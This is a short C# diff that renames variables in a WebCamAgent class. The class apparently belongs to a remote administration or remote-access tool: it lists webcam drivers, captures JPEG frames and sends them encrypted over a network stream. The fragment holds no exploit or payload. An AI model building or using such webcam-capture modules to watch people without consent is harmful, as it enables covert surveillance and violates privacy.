@@ -7,9 +7,9 @@ namespace bc.srv.Muduli.WebCam
 {
     internal class WebCamAgent
     {
-        public WebCamAgent(NetworkStream _ns)
+        public WebCamAgent(NetworkStream ns)
         {
-            webcamStream = _ns;
+            webcamStream = ns;
 
             mfm = new MsgFileManager(webcamStream);
             mm = new MsgManager(webcamStream);
@@ -88,7 +88,7 @@ namespace bc.srv.Muduli.WebCam
         /// </summary>
         private void SendDevices()
         {
-            var drivers = cc.GetWCDrivers();
+            var drivers = cc.GetWcDrivers();
 
             var sent = false;
 
@@ -145,11 +145,11 @@ namespace bc.srv.Muduli.WebCam
 
             if (isDeviceConnect) // RICONTROLLO IN CASO DI TENTATA CONNESSIONE
             {
-                var capturedJPG = cc.Capture(quality, xSize, ySize);
+                var capturedJpg = cc.Capture(quality, xSize, ySize);
 
-                if (capturedJPG != null)
+                if (capturedJpg != null)
                 {
-                    var sent = mfm.SendEncryFileByte(capturedJPG, 10000);
+                    var sent = mfm.SendEncryFileByte(capturedJpg, 10000);
                 }
             }
             else
